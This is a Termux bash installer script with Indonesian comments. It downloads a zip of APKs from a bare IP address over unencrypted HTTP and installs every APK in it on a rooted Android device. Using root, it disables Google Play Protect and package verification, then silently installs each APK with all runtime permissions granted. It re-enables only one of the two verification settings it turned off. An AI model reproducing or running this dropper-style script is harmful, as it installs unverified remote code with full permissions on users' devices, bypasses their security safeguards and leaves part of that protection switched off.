#!/data/data/com.termux/files/usr/bin/bash

# =============================================
# DIRECT DOWNLOAD INSTALLER (SDCARD / INTERNAL STORAGE VER)
# VERSION: ZIP EDITION (INSTALL ALL APKS) - ROOT BYPASS ED.
# =============================================

# Konfigurasi
DOWNLOAD_URL="http://43.134.116.2:5555/uploaded/codexlite.zip"
# Folder ini akan muncul di Internal Storage -> Download
STORAGE_DIR="/sdcard/Download/APK-Installer" 
ZIP_FILE="codexlite.zip"

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# =============================================
# 1. CEK IZIN PENYIMPANAN (PENTING!)
# =============================================
setup_storage() {
    echo -e "${BLUE}[INFO]${NC} Memeriksa akses penyimpanan..."
    
    if ls /sdcard >/dev/null 2>&1; then
        echo -e "${GREEN}[OK]${NC} Akses penyimpanan diizinkan."
    else
        echo -e "${RED}[!]${NC} Termux belum punya izin akses memori!"
        echo -e "${YELLOW}Jendela popup akan muncul, pilih 'IZINKAN' / 'ALLOW'${NC}"
        termux-setup-storage
        sleep 5
        
        echo -e "${YELLOW}Tekan Enter jika sudah mengizinkan...${NC}"
        read temp
        
        if ! ls /sdcard >/dev/null 2>&1; then
            echo -e "${RED}[ERROR]${NC} Gagal akses memori. Script tidak bisa lanjut."
            exit 1
        fi
    fi
    
    if [[ ! -d "$STORAGE_DIR" ]]; then
        mkdir -p "$STORAGE_DIR"
        echo -e "${GREEN}[OK]${NC} Folder dibuat: $STORAGE_DIR"
    fi
}

check_deps() {
    # 'jq' dihapus karena sudah tidak butuh parsing JSON API Gofile
    local deps=("curl" "tsu" "unzip")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            echo -e "${BLUE}[INFO]${NC} Menginstall $dep..."
            pkg install -y "$dep" >/dev/null 2>&1
        fi
    done
}

# =============================================
# 2. PROSES UTAMA
# =============================================
run_system() {
    clear
    echo -e "${BLUE}================================${NC}"
    echo -e "${GREEN}AUTO INSTALLER - INSTALL ALL APKS${NC}"
    echo -e "${BLUE}================================${NC}\n"
    
    check_deps
    setup_storage
    
    cd "$STORAGE_DIR" || exit
    
    echo -e "${BLUE}[INFO]${NC} Lokasi Kerja: $STORAGE_DIR"
    
    # Hapus file lama biar bersih
    rm -f *.zip *.apk
    
    # --- Download ---
    echo -e "${BLUE}[INFO]${NC} Mendownload file dari server..."
    curl -L "$DOWNLOAD_URL" --progress-bar -o "$ZIP_FILE"
        
    if [[ ! -f "$ZIP_FILE" ]]; then
        echo -e "${RED}[FAIL]${NC} Download Gagal. Cek koneksi atau link server."
        exit 1
    fi
    
    # --- Extract ZIP ---
    echo -e "${BLUE}[INFO]${NC} Mengekstrak file ZIP..."
    
    if unzip -t "$ZIP_FILE" >/dev/null 2>&1; then
        unzip -o "$ZIP_FILE" -d ./ >/dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            echo -e "${GREEN}[OK]${NC} Ekstraksi ZIP berhasil."
        else
            echo -e "${RED}[FAIL]${NC} Gagal mengekstrak ZIP."
            exit 1
        fi
    else
        echo -e "${RED}[FAIL]${NC} File ZIP corrupt atau tidak valid."
        exit 1
    fi
    
    # --- Cari semua APK ---
    echo -e "${BLUE}[INFO]${NC} Mencari file APK..."
    local apks=($(ls *.apk 2>/dev/null | sort -V))
    local total_apks=${#apks[@]}
    
    if [[ $total_apks -eq 0 ]]; then
        echo -e "${RED}[FAIL]${NC} Tidak ada APK ditemukan di dalam file ZIP tersebut."
        exit 1
    fi
    
    echo -e "${GREEN}[OK]${NC} Ditemukan ${total_apks} APK:"
    for apk in "${apks[@]}"; do
        echo "   - $apk"
    done
    echo ""
    
    # --- Install SEMUA APK ---
    echo -e "${YELLOW}[!]${NC} Memulai instalasi via Root (Bypass Mode)..."
    
    if ! command -v su &>/dev/null; then
        echo -e "${RED}[FAIL]${NC} Akses Root (su) tidak tersedia."
        exit 0
    fi
    
    # Bypass Google Play Protect / App Verifier sementara
    su -c "settings put global verifier_verify_adb_installs 0" >/dev/null 2>&1
    su -c "settings put global package_verifier_enable 0" >/dev/null 2>&1
    
    echo "----------------------------------------"
    local success=0
    local failed=0
    
    for apk in "${apks[@]}"; do
        echo -n "📦 Installing $apk... "
        
        # Eksekusi instalasi senyap dengan flag -r -t -g
        if su -c "pm install -r -t -g \"$STORAGE_DIR/$apk\"" >/dev/null 2>&1; then
            echo -e "${GREEN}✓ BERHASIL${NC}"
            ((success++))
        else
            echo -e "${RED}✗ GAGAL${NC}"
            ((failed++))
        fi
    done
    
    # Kembalikan pengaturan verifikasi keamanan seperti semula
    su -c "settings put global package_verifier_enable 1" >/dev/null 2>&1
    
    echo "----------------------------------------"
    echo -e "${GREEN}✅ Installasi selesai!${NC}"
    echo -e "   Berhasil: ${GREEN}${success}${NC} APK"
    echo -e "   Gagal: ${RED}${failed}${NC} APK"
    echo ""
    echo -e "${BLUE}[INFO]${NC} File ZIP dan APK tersimpan di:"
    echo -e "   ${YELLOW}$STORAGE_DIR${NC}"
}

run_system
